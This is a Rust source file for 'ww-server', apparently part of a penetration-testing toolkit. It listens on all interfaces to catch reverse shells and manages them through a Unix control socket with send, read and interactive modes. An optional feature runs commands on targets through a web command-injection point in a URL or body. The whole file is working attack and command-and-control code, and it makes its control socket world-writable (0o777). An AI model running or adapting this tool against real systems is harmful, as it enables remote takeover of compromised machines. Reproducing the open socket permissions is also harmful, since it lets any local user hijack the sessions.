use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use anyhow::{Context, Result};
use clap::Parser;
use serde_json::json;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, UnixListener};
use tokio::sync::Mutex;

use wirewrench::{Command, Response, ShellInfo, DEFAULT_PORT, DEFAULT_SOCKET};

// ── TCP shell session ──────────────────────────────────────────────────────

struct ShellSession {
    id: u32,
    addr: String,
    created: f64,
    alive: Arc<AtomicBool>,
    writer: Arc<Mutex<tokio::net::tcp::OwnedWriteHalf>>,
    _reader_handle: tokio::task::JoinHandle<()>,
}

impl ShellSession {
    fn new(id: u32, addr: String, stream: tokio::net::TcpStream) -> (Self, Arc<Mutex<Vec<u8>>>) {
        let (reader, writer) = stream.into_split();
        let alive = Arc::new(AtomicBool::new(true));
        let buf: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
        let buf_clone = Arc::clone(&buf);
        let alive_clone = Arc::clone(&alive);

        let reader_handle = tokio::spawn(async move {
            let mut reader = reader;
            let mut tmp = vec![0u8; 65536];
            loop {
                match reader.read(&mut tmp).await {
                    Ok(0) => {
                        alive_clone.store(false, Ordering::SeqCst);
                        break;
                    }
                    Ok(n) => {
                        let mut buf = buf_clone.lock().await;
                        buf.extend_from_slice(&tmp[..n]);
                    }
                    Err(_) => {
                        alive_clone.store(false, Ordering::SeqCst);
                        break;
                    }
                }
            }
        });

        let session = Self {
            id,
            addr,
            created: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs_f64(),
            alive: Arc::clone(&alive),
            writer: Arc::new(Mutex::new(writer)),
            _reader_handle: reader_handle,
        };
        (session, buf)
    }

    fn info(&self) -> ShellInfo {
        ShellInfo {
            id: self.id,
            addr: self.addr.clone(),
            created: self.created,
            alive: self.alive.load(Ordering::SeqCst),
        }
    }

    fn close(&mut self) {
        self.alive.store(false, Ordering::SeqCst);
        self._reader_handle.abort();
    }
}

// ── Web shell session (behind "web" feature) ───────────────────────────────

#[cfg(feature = "web")]
struct WebShellSession {
    id: u32,
    url: String,
    injection_point: String,
    method: String,
    body_template: Option<String>,
    headers: Vec<String>,
    cookie: Option<String>,
    created: f64,
    alive: Arc<AtomicBool>,
    buf: Arc<Mutex<Vec<u8>>>,
}

#[cfg(feature = "web")]
impl WebShellSession {
    fn new(id: u32, config: wirewrench::WebShellConfig) -> Self {
        Self {
            id,
            url: config.url,
            injection_point: config.injection_point,
            method: config.method,
            body_template: config.body_template,
            headers: config.headers,
            cookie: config.cookie,
            created: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs_f64(),
            alive: Arc::new(AtomicBool::new(true)),
            buf: Arc::new(Mutex::new(Vec::new())),
        }
    }

    fn info(&self) -> ShellInfo {
        ShellInfo {
            id: self.id,
            addr: format!("[web] {}", self.url),
            created: self.created,
            alive: self.alive.load(Ordering::SeqCst),
        }
    }
}

// ── Managed sessions (TCP or web) ──────────────────────────────────────────

enum ManagedSession {
    Tcp(ShellSession, Arc<Mutex<Vec<u8>>>),
    #[cfg(feature = "web")]
    Web(WebShellSession),
}

impl ManagedSession {
    fn info(&self) -> ShellInfo {
        match self {
            ManagedSession::Tcp(s, _) => s.info(),
            #[cfg(feature = "web")]
            ManagedSession::Web(s) => s.info(),
        }
    }

    fn alive(&self) -> bool {
        match self {
            ManagedSession::Tcp(s, _) => s.alive.load(Ordering::SeqCst),
            #[cfg(feature = "web")]
            ManagedSession::Web(s) => s.alive.load(Ordering::SeqCst),
        }
    }
}

// ── Session manager ────────────────────────────────────────────────────────

struct SessionManager {
    sessions: HashMap<u32, ManagedSession>,
    next_id: u32,
}

impl SessionManager {
    fn new() -> Self {
        Self { sessions: HashMap::new(), next_id: 1 }
    }

    fn add_tcp(&mut self, addr: String, stream: tokio::net::TcpStream) -> u32 {
        let id = self.next_id;
        self.next_id += 1;
        let (session, buf) = ShellSession::new(id, addr, stream);
        self.sessions.insert(id, ManagedSession::Tcp(session, buf));
        id
    }

    #[cfg(feature = "web")]
    fn add_web(&mut self, config: wirewrench::WebShellConfig) -> u32 {
        let id = self.next_id;
        self.next_id += 1;
        let session = WebShellSession::new(id, config);
        self.sessions.insert(id, ManagedSession::Web(session));
        id
    }

    fn remove(&mut self, id: u32) {
        if let Some(s) = self.sessions.remove(&id) {
            if let ManagedSession::Tcp(mut s, _) = s {
                s.close();
            }
        }
    }

    fn list(&self) -> Vec<ShellInfo> {
        self.sessions.values().map(|s| s.info()).collect()
    }
}

// ── CLI args ───────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(name = "ww-server", about = "Catch and manage reverse shells")]
struct Args {
    #[arg(short = 'p', long, default_value_t = DEFAULT_PORT)]
    port: u16,

    #[arg(short = 'H', long, default_value = "0.0.0.0")]
    host: String,

    #[arg(short = 's', long, default_value = DEFAULT_SOCKET)]
    socket: String,
}

// ── TCP listener for reverse shells ────────────────────────────────────────

async fn tcp_listener(manager: Arc<Mutex<SessionManager>>, host: &str, port: u16) -> Result<()> {
    let addr = format!("{}:{}", host, port);
    let listener = TcpListener::bind(&addr).await
        .with_context(|| format!("Failed to bind TCP on {}", addr))?;
    eprintln!("[+] Listening for reverse shells on {}", addr);

    loop {
        match listener.accept().await {
            Ok((stream, peer)) => {
                let addr = peer.to_string();
                let mgr = Arc::clone(&manager);
                tokio::spawn(async move {
                    let id = {
                        let mut mg = mgr.lock().await;
                        mg.add_tcp(addr.clone(), stream)
                    };
                    eprintln!("[+] Shell #{} caught from {}", id, addr);
                    loop {
                        let alive = {
                            let mg = mgr.lock().await;
                            mg.sessions.get(&id).map(|s| s.alive()).unwrap_or(false)
                        };
                        if !alive {
                            break;
                        }
                        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
                    }
                    let mut mg = mgr.lock().await;
                    mg.remove(id);
                    eprintln!("[-] Shell #{} disconnected", id);
                });
            }
            Err(e) => {
                eprintln!("[-] Accept error: {}", e);
            }
        }
    }
}

// ── Web shell HTTP helpers ─────────────────────────────────────────────────

#[cfg(feature = "web")]
fn url_encode(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    for byte in input.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                result.push(byte as char);
            }
            b' ' => result.push_str("%20"),
            _ => result.push_str(&format!("%{:02X}", byte)),
        }
    }
    result
}

#[cfg(feature = "web")]
fn inject_in_url(url: &str, injection: &str, command: &str) -> String {
    url.replace(injection, &url_encode(command))
}

#[cfg(feature = "web")]
fn inject_in_body(body: &str, injection: &str, command: &str) -> String {
    body.replace(injection, command)
}

#[cfg(feature = "web")]
async fn web_shell_exec(config: &wirewrench::WebShellConfig, command: &str) -> Result<String> {
    use reqwest::Client;

    let client = Client::new();
    let injected_url = inject_in_url(&config.url, &config.injection_point, command);

    let mut req = match config.method.as_str() {
        "POST" => client.post(&injected_url),
        "PUT" => client.put(&injected_url),
        "DELETE" => client.delete(&injected_url),
        "PATCH" => client.patch(&injected_url),
        _ => client.get(&injected_url),
    };

    for h in &config.headers {
        if let Some((k, v)) = h.split_once(':') {
            req = req.header(k.trim(), v.trim());
        }
    }

    if let Some(body_template) = &config.body_template {
        let body = inject_in_body(body_template, &config.injection_point, command);
        req = req.body(body);
    }

    if let Some(cookie) = &config.cookie {
        req = req.header("Cookie", cookie);
    }

    let resp = req.send().await?;
    let status = resp.status();
    let body = resp.text().await?;

    if !status.is_success() {
        eprintln!("[!] HTTP {} for command via {}", status.as_u16(), config.url);
    }

    Ok(body)
}

// ── Buffer read helper (shared by TCP and web) ─────────────────────────────

async fn read_from_buf(buf: &Mutex<Vec<u8>>, timeout: f64) -> String {
    let mut b = buf.lock().await;
    if b.is_empty() && timeout > 0.0 {
        drop(b);
        let dur = Duration::from_secs_f64(timeout.min(2.0));
        tokio::time::sleep(dur).await;
        let mut b = buf.lock().await;
        let output = String::from_utf8_lossy(&b).to_string();
        b.clear();
        output
    } else {
        let output = String::from_utf8_lossy(&b).to_string();
        b.clear();
        output
    }
}

// ── Handle a single control client ─────────────────────────────────────────

async fn handle_control(stream: tokio::net::UnixStream, manager: Arc<Mutex<SessionManager>>) -> Result<()> {
    use std::io::Read;

    let mut stream: std::os::unix::net::UnixStream = stream.into_std()?;
    stream.set_nonblocking(false)?;
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;

    let mut buf_reader = BufReader::new(&stream);
    let mut line = String::new();

    buf_reader.read_line(&mut line)?;
    if line.is_empty() {
        return Ok(());
    }

    let cmd: Command = serde_json::from_str(line.trim())?;
    let action = &cmd.action;

    macro_rules! respond {
        ($resp:expr) => {{
            let json = serde_json::to_string(&$resp)? + "\n";
            stream.write_all(json.as_bytes())?;
        }};
    }

    match action.as_str() {
        // ── List ──────────────────────────────────────────────────
        "list" => {
            let mg = manager.lock().await;
            let shells = mg.list();
            respond!(Response::with_shells(json!(shells)));
        }

        // ── Send ──────────────────────────────────────────────────
        "send" => {
            let id = cmd.id.unwrap_or(0);
            let data = cmd.data.unwrap_or_default();
            let command = data.trim().to_string();
            let wait = cmd.wait.unwrap_or(false);
            let timeout = cmd.timeout.unwrap_or(3.0);

            // Try TCP first
            let tcp_data = {
                let mg = manager.lock().await;
                match mg.sessions.get(&id) {
                    Some(ManagedSession::Tcp(s, b)) => Some((Arc::clone(&s.writer), Arc::clone(b))),
                    _ => None,
                }
            };
            if let Some((writer, buf)) = tcp_data {
                let to_send = format!("{}\n", command);
                let mut w = writer.lock().await;
                let _ = w.write_all(to_send.as_bytes()).await;
                drop(w);

                if wait {
                    let output = read_from_buf(&buf, timeout).await;
                    respond!(Response::with_output(output));
                } else {
                    respond!(Response::ok());
                }
                return Ok(());
            }

            // Try web shell
            #[cfg(feature = "web")]
            {
                let web_data = {
                    let mg = manager.lock().await;
                    match mg.sessions.get(&id) {
                        Some(ManagedSession::Web(s)) => Some((
                            wirewrench::WebShellConfig {
                                url: s.url.clone(),
                                injection_point: s.injection_point.clone(),
                                method: s.method.clone(),
                                body_template: s.body_template.clone(),
                                headers: s.headers.clone(),
                                cookie: s.cookie.clone(),
                            },
                            Arc::clone(&s.buf),
                        )),
                        _ => None,
                    }
                };
                if let Some((config, buf)) = web_data {
                    match web_shell_exec(&config, &command).await {
                        Ok(body) => {
                            if wait {
                                respond!(Response::with_output(body));
                            } else {
                                *buf.lock().await = body.into_bytes();
                                respond!(Response::ok());
                            }
                        }
                        Err(e) => respond!(Response::error(e.to_string())),
                    }
                    return Ok(());
                }
            }

            respond!(Response::error("Shell not found"));
        }

        // ── Read ──────────────────────────────────────────────────
        "read" => {
            let id = cmd.id.unwrap_or(0);
            let timeout = cmd.timeout.unwrap_or(0.2);

            // Try TCP buffer first
            let buf_opt = {
                let mg = manager.lock().await;
                match mg.sessions.get(&id) {
                    Some(ManagedSession::Tcp(_, b)) => Some(Arc::clone(b)),
                    _ => None,
                }
            };
            if let Some(buf) = buf_opt {
                let output = read_from_buf(&buf, timeout).await;
                respond!(Response::with_output(output));
                return Ok(());
            }

            // Try web shell buffer
            #[cfg(feature = "web")]
            {
                let buf_opt = {
                    let mg = manager.lock().await;
                    match mg.sessions.get(&id) {
                        Some(ManagedSession::Web(s)) => Some(Arc::clone(&s.buf)),
                        _ => None,
                    }
                };
                if let Some(buf) = buf_opt {
                    let output = read_from_buf(&buf, timeout).await;
                    respond!(Response::with_output(output));
                    return Ok(());
                }
            }

            respond!(Response::error("Shell not found"));
        }

        // ── Close ────────────────────────────────────────────────
        "close" => {
            let id = cmd.id.unwrap_or(0);
            let mut mg = manager.lock().await;
            mg.remove(id);
            respond!(Response::ok());
        }

        // ── Register web shell ───────────────────────────────────
        #[cfg(feature = "web")]
        "register_web" => {
            let config_str = cmd.data.unwrap_or_default();
            let config: wirewrench::WebShellConfig = match serde_json::from_str(&config_str) {
                Ok(c) => c,
                Err(e) => {
                    respond!(Response::error(format!("Invalid web shell config: {}", e)));
                    return Ok(());
                }
            };

            let id = {
                let mut mg = manager.lock().await;
                mg.add_web(config)
            };
            respond!(Response::with_shells(json!({"id": id})));
        }

        // ── Interact ─────────────────────────────────────────────
        "interact" => {
            let id = cmd.id.unwrap_or(0);

            // Try TCP interact first
            let tcp_data = {
                let mg = manager.lock().await;
                match mg.sessions.get(&id) {
                    Some(ManagedSession::Tcp(s, b)) => Some((
                        Arc::clone(&s.writer),
                        Arc::clone(b),
                        Arc::clone(&s.alive),
                    )),
                    _ => None,
                }
            };

            if let Some((shell_writer, shell_buf, alive)) = tcp_data {
                // ── TCP interact (existing bidirectional passthrough) ──
                let ok = serde_json::to_string(&serde_json::json!({
                    "status": "ok",
                    "message": "Entering interactive mode"
                }))? + "\n";
                stream.write_all(ok.as_bytes())?;

                let welcome = b"\r\n[+] Interactive mode. Press Ctrl+C to detach (shell stays alive)\r\n";
                stream.write_all(welcome)?;

                let mut stream2 = stream.try_clone()?;
                let done = Arc::new(AtomicBool::new(false));
                let peer_closed = Arc::new(AtomicBool::new(false));

                // Thread: read from shell buffer → write to control socket
                let buf_clone = Arc::clone(&shell_buf);
                let alive_clone = Arc::clone(&alive);
                let d1 = Arc::clone(&done);
                let pc1 = Arc::clone(&peer_closed);
                std::thread::spawn(move || {
                    let rt = tokio::runtime::Builder::new_current_thread()
                        .enable_time()
                        .build()
                        .unwrap();
                    rt.block_on(async move {
                        while !d1.load(Ordering::SeqCst) && alive_clone.load(Ordering::SeqCst) && !pc1.load(Ordering::SeqCst) {
                            let mut b = buf_clone.lock().await;
                            if !b.is_empty() {
                                let data = b.clone();
                                b.clear();
                                drop(b);
                                if stream2.write_all(&data).is_err() {
                                    pc1.store(true, Ordering::SeqCst);
                                    break;
                                }
                            } else {
                                drop(b);
                                tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
                            }
                        }
                    });
                });

                // Thread: read from control socket → write to TCP shell
                let w_shell = Arc::clone(&shell_writer);
                let d2 = Arc::clone(&done);
                let pc2 = Arc::clone(&peer_closed);
                let mut stream3 = stream.try_clone()?;
                std::thread::spawn(move || {
                    let rt = tokio::runtime::Builder::new_current_thread()
                        .enable_time()
                        .build()
                        .unwrap();
                    let _ = rt.block_on(async move {
                        let mut buf = [0u8; 65536];
                        let _ = stream3.set_read_timeout(Some(Duration::from_secs(1)));
                        loop {
                            if d2.load(Ordering::SeqCst) || pc2.load(Ordering::SeqCst) { break; }
                            match stream3.read(&mut buf) {
                                Ok(0) => { pc2.store(true, Ordering::SeqCst); break; }
                                Ok(n) => {
                                    let data = buf[..n].to_vec();
                                    let mut sw = w_shell.lock().await;
                                    let _ = sw.write_all(&data).await;
                                }
                                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock
                                    || e.kind() == std::io::ErrorKind::TimedOut => continue,
                                Err(_) => { pc2.store(true, Ordering::SeqCst); break; }
                            }
                        }
                        Ok::<_, anyhow::Error>(())
                    });
                });

                // Main thread: wait until shell dies OR peer closes
                loop {
                    tokio::time::sleep(Duration::from_millis(200)).await;
                    if !alive.load(Ordering::SeqCst) || peer_closed.load(Ordering::SeqCst) {
                        break;
                    }
                }
                done.store(true, Ordering::SeqCst);
                return Ok(());
            }

            // Try web shell interact
            #[cfg(feature = "web")]
            {
                let web_data = {
                    let mg = manager.lock().await;
                    match mg.sessions.get(&id) {
                        Some(ManagedSession::Web(s)) => Some((
                            wirewrench::WebShellConfig {
                                url: s.url.clone(),
                                injection_point: s.injection_point.clone(),
                                method: s.method.clone(),
                                body_template: s.body_template.clone(),
                                headers: s.headers.clone(),
                                cookie: s.cookie.clone(),
                            },
                            Arc::clone(&s.buf),
                        )),
                        _ => None,
                    }
                };

                if let Some((config, _buf)) = web_data {
                    use std::io::Read;

                    // Send OK response
                    let ok = serde_json::to_string(&serde_json::json!({
                        "status": "ok",
                        "message": "Entering web shell interactive mode"
                    }))? + "\n";
                    stream.write_all(ok.as_bytes())?;

                    // Welcome with initial prompt
                    stream.write_all(b"\r\n[+] Web shell interactive mode. Press Ctrl+C to detach.\r\n>> ")?;
                    stream.flush()?;

                    stream.set_read_timeout(Some(Duration::from_millis(100)))?;

                    'outer: loop {
                        let mut cmd_buf = Vec::new();
                        let mut tmp = [0u8; 65536];

                        'readline: loop {
                            match stream.read(&mut tmp) {
                                Ok(0) => break 'outer,
                                Ok(n) => {
                                    for &b in &tmp[..n] {
                                        if b == 0x03 { break 'outer; }
                                        if b == b'\n' { break 'readline; }
                                        cmd_buf.push(b);
                                    }
                                }
                                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock
                                    || e.kind() == std::io::ErrorKind::TimedOut => continue,
                                Err(_) => break 'outer,
                            }
                        }

                        let command = String::from_utf8_lossy(&cmd_buf).trim().to_string();
                        if command.is_empty() {
                            continue;
                        }

                        match web_shell_exec(&config, &command).await {
                            Ok(body) => {
                                let response = body.replace("\n", "\r\n");
                                stream.write_all(response.as_bytes())?;
                                // Prompt after response
                                stream.write_all(b"\r\n>> ")?;
                                stream.flush()?;
                            }
                            Err(e) => {
                                let msg = format!("\r\n[!] Request failed: {}\r\n", e);
                                stream.write_all(msg.as_bytes())?;
                                stream.flush()?;
                            }
                        }
                    }
                    return Ok(());
                }
            }

            respond!(Response::error("Shell not found"));
        }

        _ => {
            respond!(Response::error(format!("Unknown action: {}", action)));
        }
    }

    Ok(())
}

// ── Control server ─────────────────────────────────────────────────────────

async fn control_server(manager: Arc<Mutex<SessionManager>>, socket_path: &str) -> Result<()> {
    let _ = std::fs::remove_file(socket_path);

    let listener = UnixListener::bind(socket_path)
        .with_context(|| format!("Failed to bind Unix socket at {}", socket_path))?;
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(socket_path, std::fs::Permissions::from_mode(0o777))?;
    eprintln!("[+] Control socket at {}", socket_path);

    loop {
        match listener.accept().await {
            Ok((stream, _)) => {
                let mgr = Arc::clone(&manager);
                tokio::spawn(async move {
                    if let Err(e) = handle_control(stream, mgr).await {
                        eprintln!("[-] Control handler error: {}", e);
                    }
                });
            }
            Err(e) => {
                eprintln!("[-] Control accept error: {}", e);
            }
        }
    }
}

// ── Main ────────────────────────────────────────────────────────────────────

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    let args = Args::parse();
    let manager = Arc::new(Mutex::new(SessionManager::new()));

    let mgr1 = Arc::clone(&manager);
    let host = args.host.clone();
    tokio::spawn(async move {
        if let Err(e) = tcp_listener(mgr1, &host, args.port).await {
            eprintln!("[-] TCP listener error: {}", e);
        }
    });

    let sock = args.socket.clone();
    control_server(manager, &sock).await
}
